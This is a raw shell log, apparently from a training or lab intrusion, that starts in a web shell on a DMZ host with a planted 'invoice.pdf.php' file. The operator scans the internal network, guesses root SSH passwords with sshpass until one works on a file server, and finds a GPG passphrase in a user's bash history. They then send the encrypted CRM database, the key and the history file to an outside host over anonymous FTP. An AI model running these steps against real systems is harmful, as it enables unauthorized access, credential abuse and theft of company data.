@@ -1,0 +1,155 @@
+bash: cannot set terminal process group (227): Inappropriate ioctl for device
+bash: no job control in this shell
+www-data@mi-target-dmz:/var/www/html/invoices/870128353$ 
+ls
+
+ls
+_.sh
+invoice.pdf.php
+www-data@mi-target-dmz:/var/www/html/invoices/870128353$ 
+ip a
+
+ip a
+1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
+    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
+    inet 127.0.0.1/8 scope host lo
+       valid_lft forever preferred_lft forever
+    inet6 ::1/128 scope host 
+       valid_lft forever preferred_lft forever
+78: eth0@if79: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default qlen 1000
+    link/ether 5e:ca:51:5f:d2:86 brd ff:ff:ff:ff:ff:ff link-netnsid 0
+    inet 10.87.1.2/16 brd 10.87.255.255 scope global eth0
+       valid_lft forever preferred_lft forever
+    inet6 2001:db8:80::1:2/48 scope global 
+       valid_lft forever preferred_lft forever
+    inet6 fe80::5cca:51ff:fe5f:d286/64 scope link 
+       valid_lft forever preferred_lft forever
+www-data@mi-target-dmz:/var/www/html/invoices/870128353$ 
+nmap -sP 10.87.0.1-10
+
+
+</www/html/invoices/870128353$ nmap -sP 10.87.0.1-10     .....
+Starting Nmap 7.70 ( https://nmap.org ) at 2024-10-20 20:58 CEST
+Nmap scan report for gw.company.tld (10.87.0.1)
+Host is up (0.000075s latency).
+Nmap scan report for macbook-de-jeanmich.laptop.company.tld (10.87.0.2)
+Host is up (0.00069s latency).
+Nmap scan report for macbook-de-paul.laptop.company.tld (10.87.0.3)
+Host is up (0.00053s latency).
+Nmap scan report for macbook-de-peter.laptop.company.tld (10.87.0.4)
+Host is up (0.00046s latency).
+Nmap scan report for webint1.int.company.tld (10.87.0.5)
+Host is up (0.00040s latency).
+Nmap scan report for share.int.company.tld (10.87.0.6)
+Host is up (0.00034s latency).
+Nmap scan report for ldap.int.company.tld (10.87.0.10)
+Host is up (0.00014s latency).
+Nmap done: 10 IP addresses (7 hosts up) scanned in 1.22 seconds
+www-data@mi-target-dmz:/var/www/html/invoices/870128353$ 
+sshpass -p password ssh root@10.87.0.6
+
+
+<s/870128353$ sshpass -p password ssh root@10.87.0.6     .....
+Pseudo-terminal will not be allocated because stdin is not a terminal.
+Permission denied, please try again.
+www-data@mi-target-dmz:/var/www/html/invoices/870128353$ 
+sshpass . -p toor ssh root@10.87.0.6
+
+
+<ces/870128353$ sshpass . -p toor ssh root@10.87.0.6     .....
+sshpass: Failed to run command: No such file or directory
+www-data@mi-target-dmz:/var/www/html/invoices/870128353$ 
+sshpass -p toor ssh root@10.87.0.6
+
+
+<oices/870128353$ sshpass -p toor ssh root@10.87.0.6     .....
+Pseudo-terminal will not be allocated because stdin is not a terminal.
+Permission denied, please try again.
+www-data@mi-target-dmz:/var/www/html/invoices/870128353$ 
+sshpass -p root ssh root@10.87.0.6
+
+
+<oices/870128353$ sshpass -p root ssh root@10.87.0.6     .....
+Pseudo-terminal will not be allocated because stdin is not a terminal.
+Linux mi-target-filer 4.19.0-14-amd64 #1 SMP Debian 4.19.171-2 (2021-01-30) x86_64
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+
+whoami
+
+root
+
+pwd
+
+/root
+
+ls
+cd /home
+ls
+
+admin
+ceo
+commercial
+crm
+debian
+dev
+shared
+
+ls -lh crm
+
+total 332K
+-rw-r--r-- 1 root root 331K Oct 20 19:56 database.gpg
+
+head -n3 crm/databases.gpg
+
+head: cannot open 'crm/databases.gpg' for reading: No such file or directory
+
+head -n3 crm/database.gpg
+
+-----BEGIN PGP MESSAGE-----
+
+hQIMA2FU+bsTJSwCAQ//dF+GABI+bFm2rsNh1ipvV1Jir6NKR7PtyMzpN9y1AFwK
+
+grep -R passphrase
+
+dev/.bash_history:gpg -d --passphrase  < database.gpg 
+dev/.bash_history:gpg -d --passphrase "La clef secr..te" < database.gpg 
+dev/.bash_history:gpg -d --passphrase="La clef secr..te" < database.gpg 
+dev/.bash_history:gpg -d --passphrase="La clef secr..te" < database.gpg 
+grep: dev/.gnupg/S.gpg-agent.ssh: No such device or address
+grep: dev/.gnupg/S.gpg-agent.browser: No such device or address
+grep: dev/.gnupg/S.gpg-agent: No such device or address
+grep: dev/.gnupg/S.gpg-agent.extra: No such device or address
+
+ls dev
+
+crm.key
+
+ftp -i -n 100.120.0.4 << END_SCRIPT
+quote USER anonymous
+passive
+cd data
+put crm/database.gpg database.gpg
+put dev/crm.key crm.key
+put dev/.bash_history bash_history
+exit
+END_SCRIPT
+
+Passive mode on.
+
+exi
+
+-bash: line 20: exi: command not found
+
+exit
+
+www-data@mi-target-dmz:/var/www/html/invoices/870128353$ 
+exit
+
+exit
+exit
